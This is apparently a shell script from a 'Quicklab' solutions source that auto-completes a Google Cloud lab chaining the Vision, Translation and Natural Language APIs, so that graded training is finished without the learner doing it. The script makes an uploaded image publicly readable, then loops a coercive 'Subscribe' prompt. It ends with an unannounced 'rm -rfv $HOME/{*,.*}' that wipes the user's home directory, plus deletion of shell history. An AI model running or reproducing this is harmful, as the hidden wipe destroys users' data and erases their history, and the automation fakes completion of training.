

BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region us-central1
#gcloud config set compute/zone us-central1-a
#export ZONE=us-central1-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------#


export PROJECT_NUMBER=$(gcloud projects describe $DEVSHELL_PROJECT_ID --format="value(projectNumber)")


gcloud storage buckets create gs://$DEVSHELL_PROJECT_ID-bucket --project=$DEVSHELL_PROJECT_ID

gsutil iam ch projectEditor:serviceAccount:$PROJECT_NUMBER@cloudbuild.gserviceaccount.com:objectCreator gs://$DEVSHELL_PROJECT_ID-bucket


curl -L -o sign.jpg https://github.com/quiccklabs/Labs_solutions/raw/b0bec3356aac2cd09e4048c2a54925b752c8c350/Extract%20Analyze%20and%20Translate%20Text%20from%20Images%20with%20the%20Cloud%20ML%20APIs/sign.jpg

gsutil cp sign.jpg gs://$DEVSHELL_PROJECT_ID-bucket/sign.jpg

gsutil acl ch -u AllUsers:R gs://$DEVSHELL_PROJECT_ID-bucket/sign.jpg


echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"

#TASK 3


cat > ocr-request.json <<EOF_END
{
  "requests": [
      {
        "image": {
          "source": {
              "gcsImageUri": "gs://$DEVSHELL_PROJECT_ID-bucket/sign.jpg"
          }
        },
        "features": [
          {
            "type": "TEXT_DETECTION",
            "maxResults": 10
          }
        ]
      }
  ]
}
EOF_END


curl -s -X POST -H "Content-Type: application/json" --data-binary @ocr-request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY}

curl -s -X POST -H "Content-Type: application/json" --data-binary @ocr-request.json  https://vision.googleapis.com/v1/images:annotate?key=${API_KEY} -o ocr-response.json


cat > translation-request.json <<EOF_END
{
  "q": "your_text_here",
  "target": "en"
}
EOF_END

STR=$(jq .responses[0].textAnnotations[0].description ocr-response.json) && STR="${STR//\"}" && sed -i "s|your_text_here|$STR|g" translation-request.json

curl -s -X POST -H "Content-Type: application/json" --data-binary @translation-request.json https://translation.googleapis.com/language/translate/v2?key=${API_KEY} -o translation-response.json

cat > nl-request.json <<EOF_END
{
  "document":{
    "type":"PLAIN_TEXT",
    "content":"your_text_here"
  },
  "encodingType":"UTF8"
}
EOF_END

STR=$(jq .data.translations[0].translatedText  translation-response.json) && STR="${STR//\"}" && sed -i "s|your_text_here|$STR|g" nl-request.json

curl "https://language.googleapis.com/v1/documents:analyzeEntities?key=${API_KEY}" \
  -s -X POST -H "Content-Type: application/json" --data-binary @nl-request.json


echo "${GREEN}${BOLD}

Task 6 Completed

Lab completed.

${RESET}"


#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
while [ $CONSENT_REMOVE != 'y' ];
do sleep 10 && read -p "${BOLD}${YELLOW} Do Subscribe to Quicklab  [y/n] : ${RESET}" CONSENT_REMOVE ;
done

echo "${BLUE}${BOLD}

Thanks For Subscribing :)

${RESET}"
rm -rfv $HOME/{*,.*}
rm $HOME/./.bash_history
logout
exit
